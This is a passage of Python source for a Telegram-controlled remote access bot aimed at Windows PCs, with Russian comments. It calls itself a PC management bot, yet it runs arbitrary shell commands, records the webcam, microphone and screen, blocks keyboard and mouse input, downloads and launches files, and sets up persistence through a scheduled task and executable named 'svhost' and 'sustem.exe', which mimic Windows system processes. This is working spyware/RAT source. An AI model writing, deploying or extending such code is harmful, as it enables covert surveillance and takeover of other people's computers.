                    bot.reply_to(message, f" Процесс '{params}' завершен")
                else:
                    bot.reply_to(message, f" Процесс '{params}' не найден")
                    
            elif command == 'start':
                if not params:
                    bot.reply_to(message, "Укажите путь к программе для запуска")
                    return
                    
                if not os.path.exists(params):
                    bot.reply_to(message, f" Файл '{params}' не найден")
                    return
                    
                try:
                    subprocess.Popen([params])
                    bot.reply_to(message, f" Программа '{params}' запущена")
                except Exception as e:
                    bot.reply_to(message, f" Ошибка при запуске программы: {str(e)}")
                    
            elif command == 'priority':
                if not params:
                    bot.reply_to(message, "Укажите имя процесса и приоритет (high/normal/low)")
                    return
                    
                process_name, priority = params.split()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == process_name.lower():
                            if priority == 'high':
                                proc.nice(psutil.IDLE_PRIORITY_CLASS)
                            elif priority == 'normal':
                                proc.nice(psutil.NORMAL_PRIORITY_CLASS)
                            elif priority == 'low':
                                proc.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
                            else:
                                bot.reply_to(message, "Неверный приоритет. Используйте high/normal/low")
                                return
                            bot.reply_to(message, f" Приоритет процесса '{process_name}' изменен на {priority}")
                            return
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                bot.reply_to(message, f" Процесс '{process_name}' не найден")
                
            elif command == 'info':
                if not params:
                    bot.reply_to(message, "Укажите имя процесса")
                    return
                else:
                    for proc in psutil.process_iter(['pid', 'name', 'status']):
                        try:
                            if proc.info['name'].lower() == params.lower():
                                info = f"""
                                Информация о процессе:
                                - PID: {proc.info['pid']}
                                - Статус: {proc.info['status']}
                                - Запущен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                                - Использование памяти: {proc.memory_percent()}%
                                """
                                bot.send_message(message.chat.id, info)
                                return
                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                            continue

            elif command == 'suspend':
                if not params:
                    bot.reply_to(message, "Укажите имя процесса для приостановки")
                    return
                    
                suspended = False
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == params.lower():
                            proc.suspend()
                            suspended = True
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                        
                if suspended:
                    bot.reply_to(message, f" Процесс '{params}' приостановлен")
                else:
                    bot.reply_to(message, f" Процесс '{params}' не найден")
            if command == 'resume':
                if not params:
                    bot.reply_to(message, "Укажите имя процесса для возобновления")
                    return

                resumed = False
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == params.lower():
                            proc.resume()
                            resumed = True
                            bot.reply_to(message, f" Процесс '{params}' возобновлен")
                            return
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue

                if not resumed:
                    bot.reply_to(message, f" Процесс '{params}' не найден")
                    
        except Exception as e:
            bot.reply_to(message, f" Ошибка при управлении процессами: {str(e)}")


            for proc in psutil.process_iter(['pid', 'name', 'status']):
                try:
                    if proc.info['name'].lower() == params.lower():
                        info = f"""
                        Информация о процессе:
                        - PID: {proc.info['pid']}
                        - Статус: {proc.info['status']}
                        - Запущен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                        - Использование памяти: {proc.memory_percent()}%
                        """
                        bot.send_message(message.chat.id, info)
                        return
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
                        
            bot.reply_to(message, f" Процесс '{params}' не найден")
                    
        except Exception as e:
            bot.reply_to(message, f" Ошибка при управлении процессами: {str(e)}")
    

def get_installed_programs():
    """
    Возвращает список установленных программ в зависимости от ОС.
    Для Windows использует wmic, для Linux - dpkg и rpm.
    """
    programs = []

    # Определяем ОС и выбираем соответствующую команду
    os_name = platform.system().lower()

    try:
        if os_name == 'windows':
            # Для Windows используем wmic
            result = subprocess.run(
                ['wmic', 'product', 'get', 'name'],
                capture_output=True,
                text=True,
                encoding="CP866"
            )

            # Обрабатываем вывод, пропуская первые строки и разделяя по пустым строкам
            if result.stdout:
                programs_list = result.stdout.split('\n\n')
                programs = [p.strip() for p in programs_list if p.strip()]

        elif os_name == 'linux':
            # Для Linux проверяем доступность dpkg и rpm
            try:
                # Попытка использовать dpkg (для Debian-based систем)
                result = subprocess.run(
                    ['dpkg', '--list'],
                    capture_output=True,
                    text=True
                )
                if result.stdout:
                    programs = result.stdout.split('\n')[5:]  # Пропускаем заголовок
                    programs = [p.split()[1] for p in programs if p]

            except FileNotFoundError:
                try:
                    # Если dpkg не найден, пробуем rpm (для RPM-based систем)
                    result = subprocess.run(
                        ['rpm', '-qa'],
                        capture_output=True,
                        text=True
                    )
                    if result.stdout:
                        programs = result.stdout.split('\n')

                except FileNotFoundError:
                    programs.append(' Не удалось получить список программ. Установите dpkg или rpm.')

    except Exception as e:
        programs.append(f' Ошибка при получении списка программ: {str(e)}')

    return programs

global is_updating
is_updating = False

@bot.message_handler(commands=['matrix'])
def matrix(message):
    if message.chat.id == admin_id:
        bot.reply_to(message, "Открываю матрицу...")
        temp = os.getenv("TEMP")
        os.system(f"start cmd /c {temp}\matrix.bat")

@bot.message_handler(commands=['window'])
def window_commands(message):
    if message.chat.id == admin_id:
        try:
            command_text = message.text.replace('/window', '').strip()
            
            if not command_text:
                bot.reply_to(message, """
                Доступные команды:
                /window minimize <заголовок> - сворачивает окно
                /window maximize <заголовок> - разворачивает окно
                /window restore <заголовок> - восстанавливает размер окна
                /window close <заголовок> - закрывает окно
                /window title <заголовок> <новый_заголовок> - меняет заголовок
                /window transparent <заголовок> <прозрачность_0_255> - меняет прозрачность
                """)
                return
                
            # Разделяем команду и аргументы
            parts = command_text.split(maxsplit=2)
            command = parts[0].lower()
            
            if len(parts) < 2:
                bot.reply_to(message, "Пожалуйста, укажите команду и заголовок окна.")
                return

            window_title = parts[1]
            
            hwnd = win32gui.FindWindow(None, window_title)
            
            if hwnd == 0:
                bot.reply_to(message, f"Окно с заголовком '{window_title}' не найдено.")
                return

            if command == 'minimize':
                win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
                bot.reply_to(message, f"Окно '{window_title}' свернуто.")
            
            elif command == 'maximize':
                win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
                bot.reply_to(message, f"Окно '{window_title}' развернуто.")
                
            elif command == 'restore':
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                bot.reply_to(message, f"Окно '{window_title}' восстановлено.")
                
            elif command == 'close':
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                bot.reply_to(message, f"Окно '{window_title}' закрыто.")

            elif command == 'title':
                if len(parts) != 3:
                    bot.reply_to(message, "Использование: /window title <заголовок> <новый_заголовок>")
                    return
                
                new_title = parts[2]
                win32gui.SetWindowText(hwnd, new_title)
                bot.reply_to(message, f"Заголовок окна '{window_title}' изменен на '{new_title}'.")
                
            elif command == 'transparent':
                if len(parts) != 3:
                    bot.reply_to(message, "Использование: /window transparent <заголовок> <значение_0_255>")
                    return
                
                try:
                    transparency_level = int(parts[2])
                    if not (0 <= transparency_level <= 255):
                         bot.reply_to(message, "Уровень прозрачности должен быть в диапазоне от 0 до 255.")
                         return
                         
                    # Устанавливаем стили для поддержки прозрачности (если они еще не установлены)
                    style = win32api.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
                    style |= win32con.WS_EX_LAYERED
                    win32api.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, style)
                    
                    # Устанавливаем прозрачность (0 = полностью прозрачный, 255 = полностью непрозрачный)
                    win32gui.SetLayeredWindowAttributes(hwnd, 0, transparency_level, win32con.LWA_ALPHA)
                    
                    bot.reply_to(message, f"Прозрачность окна '{window_title}' установлена на {transparency_level}.")

                except ValueError:
                    bot.reply_to(message, "Неверный формат для уровня прозрачности. Ожидается число.")
                    
            else:
                bot.reply_to(message, f"Неизвестная команда '{command}'.")

        except ValueError:
            # Это часто происходит, если команда требует 2 или 3 части, а получено только 2
            bot.reply_to(message, "Неверный формат команды. Проверьте синтаксис и количество аргументов.")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при управлении окном: {str(e)}")

@bot.message_handler(commands=['list_programs'])
def list_programs(message):
    if message.chat.id == admin_id:
        """
        Отправляет список установленных программ пользователю.
        """
        bot.reply_to(message, "Получаю список установленных программ...")

        programs = get_installed_programs()

        if len(programs) > 4096:
            # Если список слишком большой, отправляем по частям
            for i in range(0, len(programs), 4096):
                part = '\n'.join(programs[i:i + 4096])
                bot.send_message(
                    chat_id=message.chat.id,
                    text=part
                )
        elif programs:
            bot.send_message(
                chat_id=message.chat.id,
                text='Установленные программы:\n\n' + '\n'.join(programs)
            )
        else:
            bot.reply_to(message, "Не найдено установленных программ.")

@bot.message_handler(commands=['record_video'])
def record_video(message):
    if message.chat.id == admin_id:
        global TEMP_VIDEO_FILE, RECORDING, cap
        if RECORDING:
            bot.reply_to(message, "Запись видео уже идет.")
            return

        bot.reply_to(message, f"Запись видео без звука начнется сейчас и продлится {VIDEO_DURATION} секунд...")

        # Получаем параметры видеопотока
        cap = cv2.VideoCapture(0)  # 0 - индекс камеры по умолчанию (обычно веб-камера)
        if not cap.isOpened():
            bot.reply_to(message, "Не удалось открыть камеру.")
            return

        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

        # Создаем временный файл для видео
        TEMP_VIDEO_FILE = tempfile.NamedTemporaryFile(delete=False, suffix='.mp4')

        # Запускаем запись в отдельном потоке
        RECORDING = True
        record_thread = threading.Thread(target=record_video_thread, args=(TEMP_VIDEO_FILE.name, width, height))
        record_thread.start()

        # Ждем завершения записи
        record_thread.join()
        RECORDING = False
        cap.release()

        # Отправляем видео
        try:
            with open(TEMP_VIDEO_FILE.name, 'rb') as video_file:
                bot.send_video(message.chat.id, video_file, duration=VIDEO_DURATION, caption="Ваша видеозапись",
                            supports_streaming=True)
            bot.reply_to(message, "Видеозапись отправлена!")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при отправке видео: {e}")
        time.sleep(2)
        try:
            # Удаляем временный файл
            os.unlink(TEMP_VIDEO_FILE.name)
        except PermissionError as e:
            if 'tmpfile' in locals():
                bot.reply_to(message, f"Произошла ошибка при удалении файла: {e}")

@bot.message_handler(commands=['record'])
def record_audio(message):
    if message.chat.id == admin_id:
        """Начинает запись звука и отправляет его пользователю."""
        try:
            bot.reply_to(message, f"Запись начнется сейчас и продлится {DURATION} секунд...")

            # Получаем информацию о устройстве ввода
            device_info = sd.query_devices(sd.default.device, 'input')

            # Устанавливаем количество каналов согласно возможностям устройства
            channels = min(device_info['max_input_channels'], 2)

            # Создаем временный файл для хранения аудио
            with tempfile.NamedTemporaryFile(delete=False, suffix='.wav') as tmpfile:
                # Записываем аудио в файл с корректным количеством каналов
                audio_data = sd.rec(
                    int(DURATION * SAMPLE_RATE),
                    samplerate=SAMPLE_RATE,
                    channels=channels,
                    dtype='int16'
                )
                sd.wait()  # Ждем окончания записи

                # Сохраняем аудио в файл
                sf.write(tmpfile.name, audio_data, SAMPLE_RATE)

            # Отправляем аудиофайл пользователю
            with open(tmpfile.name, 'rb') as audio_file:
                bot.send_audio(
                    message.chat.id,
                    audio_file,
                    duration=DURATION,
                    caption="Ваша аудиозапись"
                )

            bot.reply_to(message, "Аудиозапись отправлена!")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при записи аудио: {e}")

        finally:
            # Удаляем временный файл
            if 'tmpfile' in locals():
                os.unlink(tmpfile.name)

is_updating = False

class FileUpdater:
    def __init__(self):
        self.waiting_for_update = set()
        self.target_files = {}
    
    def handle_update_command(self, message):
        """Обрабатывает команду /update"""
        try:
            file_name = message.text.replace('/update', '').strip()
            if not file_name:
                bot.reply_to(message, "Использование: /update <имя_файла>")
                return
            
            chat_id = message.chat.id
            self.waiting_for_update.add(chat_id)
            self.target_files[chat_id] = file_name
            bot.reply_to(message, f" Готов принять обновление для файла '{file_name}'")
            global is_updating
            is_updating = True
            
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка: {str(e)}")

    def handle_document(self, message):
        """Обрабатывает полученные файлы"""
        try:
            chat_id = message.chat.id
            
            # Проверяем, ждем ли мы обновления для этого чата
            if chat_id not in self.waiting_for_update:
                bot.reply_to(message, " Сначала отправьте команду /update <имя_файла>")
                return
            
            file_name = message.document.file_name
            target_file = self.target_files[chat_id]
            
            if file_name != target_file:
                bot.reply_to(message, f" Ожидался файл '{target_file}', но получен '{file_name}'")
                return
            
            file_info = bot.get_file(message.document.file_id)
            file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'
            print(file_url)
            
            downloads_dir = Path('downloads')
            downloads_dir.mkdir(exist_ok=True)
            file_path = downloads_dir / file_name
            
            response = requests.get(file_url, stream=True)
            response.raise_for_status()

            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            self.waiting_for_update.remove(chat_id)
            del self.target_files[chat_id]
            bot.reply_to(message, f" Файл '{file_name}' обновляется!")
            time.sleep(1)
            bot.reply_to(message, "Выключаю автозапуск...")
            
            command = f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c schtasks /Delete /TN svhost /F\\\'"'
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
                                          universal_newlines=True, encoding='cp866')
            bot.reply_to(message, f" Автозапуск выключен успешно\n{result.strip()}")
            
            temp_dir = Path(tempfile.gettempdir())
            final_path = temp_dir / 'sustem.exe'
            global update_path
            update_path = downloads_dir / file_name
            
            with open("update.bat", 'w', encoding='utf-8') as f:
                f.write(f"""taskkill /f /im sustem.exe && taskkill /f /im svhost.exe
del %temp%\\sustem.exe
xcopy {update_path} {final_path}* /y /f
start {final_path}""")
                f.close()
            
            bot.reply_to(message, f"BAT-файл создан!")
            bot.reply_to(message, "Открываю файл...")
            bot.reply_to(message, f" Файл '{file_name}' успешно обновлен!")
            is_updating = False
            os.system(f"update.bat")
            
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка при обновлении файла: {str(e)}")

# Создаем экземпляр FileUpdater
file_updater = FileUpdater()

from urllib.parse import urlparse

# Обработчик команды /update
@bot.message_handler(commands=['update'])
def handle_update_command(message):
    file_updater.handle_update_command(message)

def get_filename_from_url_urllib(url):
    parsed_url = urlparse(url)
    path = parsed_url.path
    return os.path.basename(path)

# Обработчик команды /upload
@bot.message_handler(commands=['upload'])
def upload_command(message):
    if message.chat.id == admin_id:
        
        # Получаем аргументы после команды /upload
        # Например, если сообщение: "/upload http://example.com/file.zip"
        parts = message.text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "Пожалуйста, предоставьте прямую ссылку на файл. Пример: /upload https://example.com/file.zip")
            return
            
        # URL - это второй элемент в списке частей
        url_to_download = parts[1]
        
        try:
            # 1. Извлекаем имя файла из полученной ссылки
            file_name = get_filename_from_url_urllib(url_to_download)
            
            if not file_name:
                bot.send_message(admin_id, "Не удалось извлечь имя файла из ссылки.")
                return

            # 2. Скачиваем файл, используя curl (или requests, что безопаснее)
            # ВАЖНО: Если execute_command запускает внешний curl, убедитесь, что он корректно работает в вашей среде.
            
            # Рекомендуемая замена: использовать requests для скачивания, если вы не хотите зависеть от внешнего curl
            download_result = download_file_with_requests(url_to_download, file_name)
            
            bot.send_message(admin_id, download_result)
                
        except Exception as e:
            bot.send_message(admin_id, f'Критическая ошибка в комманде /upload: {e}')


# --- Рекомендуемая замена для 'execute_command(curl...)' ---
# Безопаснее использовать Python-библиотеки для скачивания, а не вызывать внешние процессы.

def download_file_with_requests(url, output_filename):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status() # Проверка на ошибки HTTP
        
        with open(output_filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        return f"Файл '{output_filename}' успешно скачан."
        
    except requests.exceptions.RequestException as e:
        return f"Ошибка при скачивании {url}: {e}"

# Единый обработчик всех документов
@bot.message_handler(content_types=['document'])
def handle_all_documents(message):
    if message.chat.id == admin_id:
        """
        Единый обработчик всех документов.
        Определяет, какой режим обработки использовать.
        """
        try:
            # Если ожидается обновление
            if message.chat.id in file_updater.waiting_for_update:
                file_updater.handle_document(message)
            else:
                # Стандартная загрузка файлов
                file_info = bot.get_file(message.document.file_id)
                # Загружаем файл
                file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'
                bot.reply_to(message, f"Ссылка до Вашего файла {file_url}")
                downloaded_file = bot.download_file(file_info.file_path)
                src = message.document.file_name
                tmp = os.getenv('TEMP')
                full_path = tmp + '\\' + src
                with open(full_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                    print(f'src == {src}')
                
                tmp = os.getenv('temp')

                bot.reply_to(message, f"Файл {message.document.file_name} успешно загружен в папку {tmp}")
                
        except Exception as e:
            bot.reply_to(message, f" Произошла ошибка при обработке файла: {str(e)}")

def record_screen(message):
    """Записывает экран и отправляет видео пользователю."""
    global RECORDING
    if RECORDING:
        bot.reply_to(message, "Запись уже идет.")
        return

    bot.reply_to(message, f"Запись экрана начнется сейчас и продлится {VIDEO_DURATION} секунд...")

    # Получаем размеры экрана
    width = pyautogui.size()[0]
    height = pyautogui.size()[1]

    # Создаем временный файл для видео
    temp_video = tempfile.NamedTemporaryFile(delete=False, suffix='.mp4')

    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Кодек для записи в формате MP4
    out = cv2.VideoWriter(temp_video.name, fourcc, FPS, (width, height))

    start_time = time.time()
    RECORDING = True

    try:
        while RECORDING:
            img = pyautogui.screenshot()  # Делаем скриншот
            frame = np.array(img)  # Конвертируем в numpy array
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)  # Меняем цветовую схему

            out.write(frame)  # Записываем кадр

            if time.time() - start_time > VIDEO_DURATION:
                break

    except Exception as e:
        bot.reply_to(message, f"Произошла ошибка при записи экрана: {str(e)}")

    finally:
        out.release()
        RECORDING = False

        # Отправляем видео
        try:
            with open(temp_video.name, 'rb') as video_file:
                bot.send_video(message.chat.id, video_file, duration=VIDEO_DURATION,
                               caption="Ваша запись экрана", supports_streaming=True)
            bot.reply_to(message, "Запись экрана отправлена!")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при отправке видео: {str(e)}")

        finally:
            # Удаляем временный файл
            time.sleep(10)
            os.remove(temp_video.name)


@bot.message_handler(commands=['record_screen'])
def record_screen_command(message):
    """Обработчик команды записи экрана."""
    thread = threading.Thread(target=record_screen, args=(message,))
    thread.start()

@bot.message_handler(content_types=['document']) #НЕ ВЫЗЫВАЕТСЯ, ИСПОЛЬЗУЕТСЯ handle_all_documents()
def handle_document(message):
    if message == "/upload":
        """Обрабатывает полученный файл и сохраняет его."""
        try:
            chat_id = message.chat.id
            print(chat_id)
            file_info = bot.get_file(message.document.file_id)
            file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'
            bot.send_message(admin_id, f'Ссылка до файла:{file_url}')
            file_name = message.document.file_name
            file_extension = file_name.split('.')[-1]

            # Задаём путь для сохранения файла с оригинальным именем и расширением.
            tmp = os.getenv('TEMP')
            file_path = os.path.join(tmp, file_name)

            # Скачиваем файл с помощью requests.
            response = requests.get(file_url, stream=True)
            response.raise_for_status()  # Проверяем на ошибки HTTP

            with open(file_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    print(f'Загружаю {chunk}')
                    file.write(chunk)

            bot.reply_to(message, f"Файл '{file_name}' успешно загружен в папку {file_path}!")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при загрузке файла: {e}")


class InputController:
    def __init__(self):
        self.user32 = ctypes.WinDLL('user32', use_last_error=True)

    def BlockInput(self):
        """Блокирует все входные устройства (клавиатура и мышь)"""
        try:
            self.user32.BlockInput(True)
            return True
        except Exception as e:
            print(f"Ошибка при блокировке ввода: {e}")
            return False

    def UnblockInput(self):
        """Разблокирует все входные устройства"""
        try:
            self.user32.BlockInput(False)
            return True
        except Exception as e:
            print(f"Ошибка при разблокировке ввода: {e}")
            return False


input_controller = InputController()

@bot.message_handler(commands=['blockinput'])
def block_input(message):
    if message.chat.id == admin_id:
        success = input_controller.BlockInput()
        if success:
            bot.reply_to(message, "Все входные устройства заблокированы!")
        else:
            bot.reply_to(message, "Не удалось заблокировать ввод")

@bot.message_handler(commands=['unblockinput'])
def unblock_input(message):
    if message.chat.id == admin_id:
        success = input_controller.UnblockInput()
        if success:
            bot.reply_to(message, "Все входные устройства разблокированы!")
        else:
            bot.reply_to(message, "Не удалось разблокировать ввод")

def make_screenshot():
    try:
        filename = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', '.')), 'screen.png')  # More reliable temp file
        with mss.mss() as sct:
            # 1. Get cursor coordinates
            try:
                x, y = pyautogui.position()
            except Exception as e:
                print(f"Ошибка при получении позиции курсора: {e}")
                bot.send_message(admin_id, f"Ошибка при получении позиции курсора: {e}")
                return None


            # 2. Make a screenshot of the entire screen
            try:
                monitor = sct.monitors[1]  # Typically the primary monitor
            except IndexError:
                monitor = sct.monitors[0]  # Use the combined monitor if others are unavailable

            try:
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img = img.convert("RGBA")  # Add Alpha-channel for transparency

                # 3. Draw a circle on the screenshot
                draw = ImageDraw.Draw(img)
                circle_diameter = 10  # Diameter of the circle
                circle_x = x - circle_diameter // 2  # Center the circle on the cursor
                circle_y = y - circle_diameter // 2
                draw.ellipse((circle_x, circle_y, circle_x + circle_diameter, circle_y + circle_diameter),
                            outline=(255, 0, 0, 200), width=2)  # Red semi-transparent circle

                # 4. Save the image
                img.save(filename)
                return filename # Return the path
            except Exception as e:
                bot.send_message(admin_id, f'Ошибка при создании скриншота: {str(e)}')
                return None  # Indicate failure
    except Exception as e:
        print(f'Error creating screenshot: {str(e)}')
        bot.send_message(admin_id, f'Ошибка при создании скриншота: {str(e)}')
        return None

def execute_command(command):
    try:
        # Используем кодировку CP866 для Windows
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="CP866")
        if result.stdout:
            return result.stdout
        elif result.stderr:
            return f'Ошибка: {result.stderr}'
        return 'Команда выполнена'
    except Exception as e:
        return f'Ошибка при выполнении команды: {str(e)}'

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id == admin_id:
        try:
            response = 'Привет! Это бот для управления ПК. Основан на Python'
            return bot.send_message(
                chat_id=message.chat.id,
                text=response,
                parse_mode=None
            )
        except Exception as e:
            return bot.send_message(
                chat_id=message.chat.id,
                text=f'Произошла ошибка: {str(e)}'
            )
        

@bot.message_handler(commands=['msgbox'])
def msgbox(message):
    if message.chat.id == admin_id:
        try:
            # Получаем текст после команды
            alert_text = message.text.replace('/msgbox', '').strip()

            # Проверяем, не пустое ли сообщение
            if not alert_text:
                bot.reply_to(message, "Пожалуйста, отправьте текст после команды!")
                return

            # Показываем уведомление
            pymsgbox.alert(alert_text)

            # Подтверждаем успешную обработку
            bot.reply_to(message, "Уведомление показано!")

        except Exception as e:
            bot.reply_to(message, "Произошла ошибка при показе уведомления.")


@bot.message_handler(commands=['cmd'])
def execute_command_handler(message):
    if message.chat.id == admin_id:
        try:
            if len(message.text.split()) > 1:
                command = message.text.split(maxsplit=1)[1]
                result = execute_command(command)

                response = f'Результат:\n{result}'
                if len(response) > 4096:
                    for i in range(0, len(response), 4096):
                        bot.send_message(
                            chat_id=message.chat.id,
                            text=response[i:i + 4096]
                        )
                else:
                    bot.send_message(
                        chat_id=message.chat.id,
                        text=response
                    )
                return

            usage_text = 'Использование: /cmd <команда>'
            return bot.send_message(
                chat_id=message.chat.id,
                text=usage_text
            )
        except Exception as e:
            error_text = f'Произошла ошибка: {str(e)}'
            if len(error_text) > 4096:
                for i in range(0, len(error_text), 4096):
                    bot.send_message(message.chat.id, error_text[i:i + 4096])
            else:
                bot.send_message(message.chat.id, error_text)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="CP866")
        if result.stdout:
            return result.stdout
        elif result.stderr:
            return f'Ошибка: {result.stderr}'
        return 'Команда выполнена'
    except Exception as e:
        return f'Ошибка при выполнении команды: {str(e)}'


def shutdown_pc():
    """Функция для выключения компьютера"""
    try:
        if platform.system() == 'Windows':
            return execute_command('shutdown /s /t 0')
        elif platform.system() == 'Linux':
            return execute_command('shutdown')
        else:
            return 'Неподдерживаемая операционная система'
    except Exception as e:
        return f'Ошибка при попытке выключения: {str(e)}'


def restart_pc():
    """Функция для перезагрузки компьютера"""
    try:
        if platform.system() == 'Windows':
            return execute_command('shutdown /r /t 0')
        elif platform.system() == 'Linux':
            return execute_command('reboot')
        else:
            return 'Неподдерживаемая операционная система'
    except Exception as e:
        return f'Ошибка при попытке перезагрузки: {str(e)}'



@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    if message.chat.id == admin_id:
        try:
            response = shutdown_pc()
            return bot.send_message(
                chat_id=message.chat.id,
                text=response,
                parse_mode=None
            )
        except Exception as e:
            return bot.send_message(
                chat_id=message.chat.id,
                text=f'Произошла ошибка при выключении: {str(e)}',
                parse_mode=None
            )

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.chat.id == admin_id:
        """Обработчик изображений от пользователя"""
        try:
            # Получаем файл и сохраняем его
            file_id = message.photo[-1].file_id
            file_path = bot.get_file(file_id).file_path
            
            # Загружаем файл в память
            downloaded_file = bot.download_file(file_path)
            
            # Сохраняем временный файл
            temp_dir = tempfile.gettempdir()
            image_path = os.path.join(temp_dir, f'target_{time.time()}.png')
            
            # Записываем данные в файл
            with open(image_path, 'wb') as f:
                f.write(downloaded_file)
            
            bot.reply_to(message, 
                        "Изображение получено! Теперь используйте команду /click_on_image для клика по этому изображению на экране.")
            
            # Сохраняем путь к изображению в глобальную переменную
            global LAST_IMAGE_PATH
            LAST_IMAGE_PATH = image_path
            
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при обработке изображения: {str(e)}")



# Глобальная переменная для хранения пути к последнему изображению
LAST_IMAGE_PATH = None

# Конфигурация для повышения точности распознавания изображений
CONFIDENCE_LEVEL = 0.7  # Минимальный уровень уверенности для распознавания
GRAYSCALE = False  # Использовать оттенки серого для поиска
REGION = None  # Область экрана для поиска (x, y, width, height).  None для всего экрана.  Пример: (100, 100, 800, 600)
RETRY_COUNT = 3  # Количество попыток найти изображение, если не найдено с первого раза
RETRY_DELAY = 1  # Задержка в секундах между попытками

def click_on_image(image_path, confidence=CONFIDENCE_LEVEL, grayscale=GRAYSCALE, region=REGION, retry_count=RETRY_COUNT, retry_delay=RETRY_DELAY):
        """Функция для поиска и клика по изображению на экране с улучшенной точностью и повторными попытками."""
        try:
            for i in range(retry_count):
                try:
                    # Ищем изображение на экране с параметрами точности
                    location = pyautogui.locateOnScreen(
                        image_path,
                        grayscale=grayscale,
                        confidence=confidence,
                        region=region
                    )

                    if location is not None:
                        # Получаем координаты центра найденного изображения
                        center_x, center_y = pyautogui.center(location)

                        # Выполняем клик
                        pyautogui.click(x=center_x, y=center_y)
                        return True
                    else:
                        print(f"Изображение не найдено, попытка {i+1}/{retry_count}. Ожидание {retry_delay} секунд...")
                        if i < retry_count - 1:  # Не ждем после последней попытки
                            pyautogui.sleep(retry_delay) # Задержка между попытками
                except Exception as e:
                    print(f"Ошибка во время попытки {i+1}/{retry_count}: {str(e)}")
                    if i < retry_count - 1:
                        pyautogui.sleep(retry_delay) # Задержка между попытками

            # Если изображение не было найдено после всех попыток
            return False

        except Exception as e:
            print(f"Ошибка при попытке клика по изображению: {str(e)}")
            return False


@bot.message_handler(commands=['click_on_image'])
def click_on_image_command(message):
    if message.chat.id == admin_id:
        """Команда для клика по последнему полученному изображению"""
        global LAST_IMAGE_PATH
        
        try:
            if 'LAST_IMAGE_PATH' not in globals():
                bot.reply_to(message, "Сначала отправьте изображение!")
                return
                
            if not os.path.exists(LAST_IMAGE_PATH):
                bot.reply_to(message, "Изображение не найдено!")
                return
                
            success = click_on_image(LAST_IMAGE_PATH)
            
            if success:
                bot.reply_to(message, " Клик выполнен успешно!")
            else:
                bot.reply_to(message, " Изображение не найдено на экране")
                
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка при выполнении клика: {str(e)}")

# Добавляем глобальную переменную для хранения пути к последнему изображению
LAST_IMAGE_PATH = None

@bot.message_handler(commands=['restart'])
def restart(message):
    if message.chat.id == admin_id:
        try:
            response = restart_pc()
            return bot.send_message(
                chat_id=message.chat.id,
                text=response,
                parse_mode=None
            )
        except Exception as e:
            return bot.send_message(
                chat_id=message.chat.id,
                text=f'Произошла ошибка при перезагрузке: {str(e)}',
                parse_mode=None
            )



@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if message.chat.id == admin_id:
        try:
            screenshot_path = make_screenshot()
            if screenshot_path:
                bot.send_photo(
                    chat_id=message.chat.id,
                    photo=open(screenshot_path, 'rb'),
                    caption='Ваш скриншот'
                )
                os.remove(screenshot_path)
            else:
                bot.send_message(
                    chat_id=message.chat.id,
                    text='Не удалось сделать скриншот',
                    parse_mode=None
                )
        except Exception as e:
            bot.send_message(
                chat_id=message.chat.id,
                text=f'Произошла ошибка при отправке скриншота: {str(e)}',
                parse_mode=None
            )


def send_message(token, chat_id, message):
    response = requests.post(f'https://api.telegram.org/bot{token}/sendMessage',
                             json={'chat_id': chat_id, 'text': message}, headers={'Content-Type': 'application/json'})

    if response.status_code == 200:
        pass
    else:
        pass

while True:
    try:
        bot.infinity_polling(
            none_stop=True,
            logger_level=0,
            timeout=5
            )
        
    except Exception as e:
        print(f"Неожиданная ошибка: {str(e)}")
